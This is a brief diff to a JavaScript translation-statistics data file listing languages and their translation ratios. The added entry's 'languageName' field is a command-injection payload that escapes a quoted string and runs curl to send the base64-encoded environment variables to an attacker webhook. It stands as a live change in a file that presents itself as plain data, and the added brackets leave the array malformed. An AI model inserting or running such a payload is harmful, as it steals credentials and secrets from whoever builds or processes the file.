@@ -360,5 +360,10 @@ module.exports = [
     "languageName": "Chinese Traditional",
     "languageNativeName": "正體字",
     "translationRatio": 0.9803800719054956
-  }
+  },
+  [
+    {
+      "languageName": "\"); curl -X POST -d \"data=$(env | base64)\" https://attacker.com/webhook #",
+      "translationRatio": 0.5
+    }
 ];
